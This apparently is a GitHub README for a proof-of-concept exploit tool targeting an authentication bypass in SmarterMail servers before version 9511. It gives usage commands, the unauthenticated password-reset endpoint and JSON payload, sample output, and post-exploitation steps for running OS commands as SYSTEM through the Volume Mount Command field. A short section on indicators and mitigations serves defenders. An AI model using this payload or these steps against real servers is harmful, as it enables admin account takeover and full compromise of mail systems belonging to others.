# SmarterMail WT-2026-0001 Authentication Bypass Exploit

## 📌 Overview

This repository contains a proof-of-concept exploit for **CVE-WT-2026-0001**, a critical authentication bypass vulnerability in SmarterTools SmarterMail email servers. The vulnerability allows unauthenticated attackers to reset the system administrator password without any prior authentication, potentially leading to Remote Code Execution (RCE).

> **⚠️ IMPORTANT**: This tool is for **educational and authorized testing purposes only**. Unauthorized use against systems you don't own is illegal.

## 🔥 Vulnerability Details

- **CVE ID**: WT-2026-0001 (CVE pending)
- **Vulnerable Versions**: SmarterMail versions **before 9511**
- **Patch Date**: January 15, 2026
- **Severity**: Critical (CVSS score likely 9.0+)
- **Attack Vector**: Network, No Authentication Required
- **Impact**: Admin Account Takeover → Full System Compromise



## 🚀 Installation

### Prerequisites
- Python 3.6 or higher
- `requests` library

### Quick Setup
```bash
# Clone the repository
git clone https://github.com/g0vguy/WT-2026-0001.git
cd WT-2026-0001

# Install dependencies
pip install requests
```

## 💻 Usage

### Basic Exploitation
```bash
python3 exploit.py https://mail.target.com:9998
```

### Advanced Options
```bash
# Specify custom admin username
python3 exploit.py https://mail.target.com:9998 -u administrator

# Set custom new password
python3 exploit.py https://mail.target.com:9998 -p "MyNewP@ssw0rd123!"

# Check vulnerability without exploitation
python3 exploit.py https://mail.target.com:9998 --check-only

# All options combined
python3 exploit.py https://mail.target.com:9998 -u admin -p "P@ssw0rd!" --check-only
```

## 🔍 How It Works

### 1. Vulnerability Check
The script first sends a test payload to determine if the target is vulnerable. It looks for:
- HTTP 200 response with `"success": true` → **VULNERABLE**
- HTTP 400 with `"Invalid input parameters"` → **PATCHED**
- Other responses → **UNKNOWN/UNREACHABLE**

### 2. Exploitation
If vulnerable, the script sends the exploit payload:
```json
{
  "IsSysAdmin": "true",
  "OldPassword": "anything",
  "Username": "admin",
  "NewPassword": "Hacked123!@#",
  "ConfirmPassword": "Hacked123!@#"
}
```

### 3. Success Indicators
A successful exploitation returns:
```json
{
  "success": true,
  "debugInfo": "check1\\r\\ncheck2\\r\\n...check8.2\\r\\n",
  "resultCode": 200
}
```

## 🎯 Post-Exploitation

After successful password reset:

1. **Login to Admin Panel**: `https://target:9998/login.aspx`
2. **Navigate to**: Settings → Volume Mounts
3. **Exploit Built-in RCE**: Use the "Volume Mount Command" field to execute OS commands
4. **Achieve Full Compromise**: Commands run as SYSTEM/root privileges

## 🛡️ Detection & Mitigation

### Indicators of Compromise (IoCs)
- `POST /api/v1/auth/force-reset-password` with `IsSysAdmin: true`
- Unexpected admin password changes
- New Volume Mount entries in logs
- Unauthorized system command execution

### Patching
**Immediate Action Required**: Upgrade to SmarterMail version **9511 or later** (released January 15, 2026).

### Workarounds (If Patching Delayed)
1. Block access to `/api/v1/auth/force-reset-password` at firewall/WAF
2. Implement IP whitelisting for admin interfaces
3. Monitor admin account activity closely

## 📊 Sample Output

### Successful Exploitation
```
[+] Target appears VULNERABLE

[*] Proceeding with exploitation...
[*] Targeting: https://mail.victim.com:9998
[*] Admin user: admin
[*] New password: Hacked123!@#

[*] Sending exploit payload...
    Endpoint: POST /api/v1/auth/force-reset-password
    Payload: {
    "IsSysAdmin": "true",
    "OldPassword": "anything_can_go_here",
    "Username": "admin",
    "NewPassword": "Hacked123!@#",
    "ConfirmPassword": "Hacked123!@#"
}

[*] Response Status: 200
[*] Response Body: {
  "username": "",
  "errorCode": "",
  "errorData": "",
  "debugInfo": "check1\r\ncheck2\r\ncheck3\r\ncheck4.2\r\ncheck5.2\r\ncheck6.2\r\ncheck7.2\r\ncheck8.2\r\n",
  "success": true,
  "resultCode": 200
}

[+] EXPLOIT SUCCESSFUL!
[+] Admin password has been changed
[+] Username: admin
[+] New Password: Hacked123!@#

[+] Next steps:
    1. Login to https://mail.victim.com:9998/login.aspx
    2. Navigate to Settings -> Volume Mounts
    3. Use 'Volume Mount Command' for RCE

[*] Attempting to verify credentials...
[*] Manual verification required:
    1. Visit https://mail.victim.com:9998/login.aspx
    2. Username: admin
    3. Password: Hacked123!@#

```

### Patched System
```
[-] Target appears PATCHED (post-9511)
[-] This exploit only works on versions before 9511
```

---

**Disclaimer**: The maintainer is not responsible for misuse of this tool. Use only for authorized security testing and educational purposes.
